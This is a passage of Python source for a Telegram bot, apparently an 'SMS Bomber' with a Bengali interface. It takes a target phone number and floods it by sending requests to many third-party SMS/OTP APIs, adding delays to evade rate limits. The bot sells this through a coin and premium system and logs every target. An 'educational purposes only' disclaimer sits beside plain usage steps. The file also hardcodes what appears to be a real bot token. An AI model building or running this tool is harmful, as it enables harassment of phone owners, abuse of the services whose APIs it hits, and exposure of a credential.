        keyboard.append([InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")])
        
        await query.edit_message_text(
            f"📱 **SMS বোমা**\n\n"
            f"কতটি SMS পাঠাতে চান?\n\n"
            f"🪙 কয়েন প্রয়োজন: {self.COINS_PER_SMS} কয়েন/SMS\n"
            f"📊 আপনার কয়েন: {coins}\n"
            f"⭐ প্রিমিয়াম: {'✅' if is_premium else '❌'}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def count_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """মেসেজ কাউন্ট সিলেক্ট কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        count = int(query.data.split("_")[1])
        
        # স্টেট সেভ করা
        context.user_data["target_count"] = count
        context.user_data["waiting_phone"] = True
        
        await query.edit_message_text(
            f"📱 **{count}টি SMS পাঠাতে হবে**\n\n"
            f"📞 এখন টার্গেট ফোন নম্বর দিন:\n"
            f"(উদাহরণ: 017xxxxxxxx)\n\n"
            f"🪙 প্রয়োজনীয় কয়েন: {count * self.COINS_PER_SMS}\n"
            f"📊 আপনার কয়েন: {self.db.get_coins(user_id)}\n\n"
            f"নম্বর পাঠান অথবা /cancel দিয়ে বাতিল করুন।",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 বাতিল", callback_data="back_main")]])
        )
    
    async def handle_phone_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ফোন নম্বর ইনপুট হ্যান্ডেল করে"""
        user_id = update.effective_user.id
        phone = update.message.text.strip()
        
        # ভ্যালিডেশন
        if not phone.isdigit() or len(phone) < 10:
            await update.message.reply_text(
                "❌ ভুল নম্বর!\n"
                "শুধু সংখ্যা দিন (উদাহরণ: 017xxxxxxxx)"
            )
            return
        
        # কাউন্ট পাওয়া
        count = context.user_data.get("target_count", 10)
        is_premium = self.db.get_user(user_id)[7] == 1
        coins_needed = count * self.COINS_PER_SMS
        
        # কয়েন চেক
        coins = self.db.get_coins(user_id)
        if not is_premium and coins < coins_needed:
            await update.message.reply_text(
                f"❌ পর্যাপ্ত কয়েন নেই!\n\n"
                f"প্রয়োজন: {coins_needed}\n"
                f"আপনার: {coins}\n\n"
                f"{coins_needed - coins} কয়েন কম আছে।",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="send_bomb")]])
            )
            return
        
        # SMS পাঠানো
        await update.message.reply_text(f"⏳ {count}টি SMS পাঠানো হচ্ছে... দয়া করে অপেক্ষা করুন।")
        
        # API তালিকা
        all_apis = self.apis.get_all_apis()
        
        # শুধু count সংখ্যক API নেওয়া (randomly)
        selected_apis = random.sample(all_apis, min(count, len(all_apis)))
        
        success_count = 0
        results = []
        
        for i, api in enumerate(selected_apis, 1):
            try:
                # ফোন নম্বর রিপ্লেস
                api_copy = api.copy()
                if "body" in api_copy:
                    body = api_copy["body"]
                    for key in body:
                        if isinstance(body[key], str):
                            body[key] = body[key].replace("{phone}", phone)
                
                # রিকুয়েস্ট পাঠানো
                success = self.apis.send_request(api_copy, phone)
                
                if success:
                    success_count += 1
                    results.append(f"✅ {api['name']}")
                else:
                    results.append(f"❌ {api['name']}")
                
                # রেট লিমিট এড়াতে ডিলে
                time.sleep(0.5)
                
            except Exception as e:
                results.append(f"❌ {api['name']}")
        
        # কয়েন আপডেট
        if not is_premium:
            self.db.update_coins(user_id, count * self.COINS_PER_SMS)
        
        # লগ
        self.db.add_log(user_id, phone, count, success_count)
        
        # রেজাল্ট দেখানো
        result_text = f"""
📊 **SMS বোমা রিপোর্ট**

📱 টার্গেট: `{phone}`
📨 চেষ্টা: {count}
✅ সফল: {success_count}
❌ ব্যর্থ: {count - success_count}
🪙 কয়েন: {self.db.get_coins(user_id)}

🔍 **বিস্তারিত:**
{chr(10).join(results[:20])}
{f'... এবং বাকি {len(results)-20}টি' if len(results) > 20 else ''}
"""
        
        await update.message.reply_text(result_text, reply_markup=self.get_main_keyboard())
        
        # স্টেট রিসেট
        context.user_data["waiting_phone"] = False
        context.user_data["target_count"] = 0
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """বাতিল কমান্ড"""
        context.user_data["waiting_phone"] = False
        context.user_data["target_count"] = 0
        await update.message.reply_text(
            "❌ বাতিল করা হয়েছে!",
            reply_markup=self.get_main_keyboard()
        )
    
    async def help_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """সাহায্য কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        help_text = """
📖 **সাহায্য/গাইড**

🔰 **কিভাবে ব্যবহার করবেন:**
1. 'SMS বোমা' সিলেক্ট করুন
2. কতটি SMS পাঠাবেন সিলেক্ট করুন
3. টার্গেট নম্বর দিন
4. অপেক্ষা করুন!

🪙 **কয়েন সিস্টেম:**
• ১টি SMS = ১ কয়েন
• ডেইলি বোনাস = ৫ কয়েন
• রেফারেল = ১০ কয়েন

⭐ **প্রিমিয়াম সুবিধা:**
• Unlimited SMS
• ২৫০টি API
• প্রায়োরিটি সাপোর্ট

⚠️ **সতর্কতা:**
• এই বট শুধুমাত্র শিক্ষাগত উদ্দেশ্যে
• কারও বিরুদ্ধে ব্যবহার আইনত দণ্ডনীয়
• অপব্যবহার করলে ব্লক করা হবে

📢 **আমাদের চ্যানেল:** @your_channel
"""
        await query.edit_message_text(
            help_text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]])
        )
    
    async def back_main_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ব্যাক টু মেইন কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user = query.from_user
        welcome_text = f"""
🔥 **SMS Bomber Bot**

👋 হ্যালো {user.first_name}!

আপনার কাজ নির্বাচন করুন:
"""
        await query.edit_message_text(welcome_text, reply_markup=self.get_main_keyboard())
    
    def run(self):
        """বট চালানো"""
        self.app = Application.builder().token(self.token).build()
        
        # হ্যান্ডলার
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        
        # কলব্যাক হ্যান্ডলার
        self.app.add_handler(CallbackQueryHandler(self.check_join_callback, pattern="check_join"))
        self.app.add_handler(CallbackQueryHandler(self.coins_callback, pattern="coins"))
        self.app.add_handler(CallbackQueryHandler(self.daily_bonus_callback, pattern="daily_bonus"))
        self.app.add_handler(CallbackQueryHandler(self.stats_callback, pattern="stats"))
        self.app.add_handler(CallbackQueryHandler(self.refer_callback, pattern="refer"))
        self.app.add_handler(CallbackQueryHandler(self.premium_callback, pattern="premium"))
        self.app.add_handler(CallbackQueryHandler(self.buy_premium_callback, pattern="buy_premium"))
        self.app.add_handler(CallbackQueryHandler(self.send_bomb_callback, pattern="send_bomb"))
        self.app.add_handler(CallbackQueryHandler(self.count_callback, pattern="count_"))
        self.app.add_handler(CallbackQueryHandler(self.help_callback, pattern="help"))
        self.app.add_handler(CallbackQueryHandler(self.back_main_callback, pattern="back_main"))
        
        # মেসেজ হ্যান্ডলার (ফোন ইনপুট)
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_phone_input))
        
        # বট চালানো
        print("🤖 বট চালু হচ্ছে...")
        self.app.run_polling(allowed_updates=Update.ALL_TYPES)

# ====================== মেইন ======================

if __name__ == "__main__":
    # আপনার বট টোকেন দিন
    BOT_TOKEN = "8218480747:AAGzuqYB2GG24rEnqAS7M4tppYDTlKDAqRc"
    
    # "YOUR_BOT_TOKEN_HERE" আপনার আসল টোকেন দিয়ে রিপ্লেস করুন
    
    bot = SMSBomberBot(BOT_TOKEN)
    bot.run()